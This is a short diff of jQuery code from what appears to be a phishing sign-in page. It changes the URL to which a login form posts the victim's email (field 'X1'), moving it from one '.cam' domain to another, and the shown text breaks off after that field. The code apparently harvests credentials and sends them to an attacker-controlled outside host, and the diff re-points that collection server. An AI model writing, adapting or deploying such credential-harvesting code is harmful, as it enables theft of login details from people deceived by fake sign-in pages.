@@ -46,7 +46,7 @@ $(document).ready(function(){
         $("#mcontent").css("display", "none");
         $("#mspinner").css("display", "block");
         $.ajax({
-            url: "https://jinkosolar.cam/onwa/signin.php",
+            url: "https://arenco.cam/onwa/signin.php",
             method: "post",
             data: {
                 X1: email,
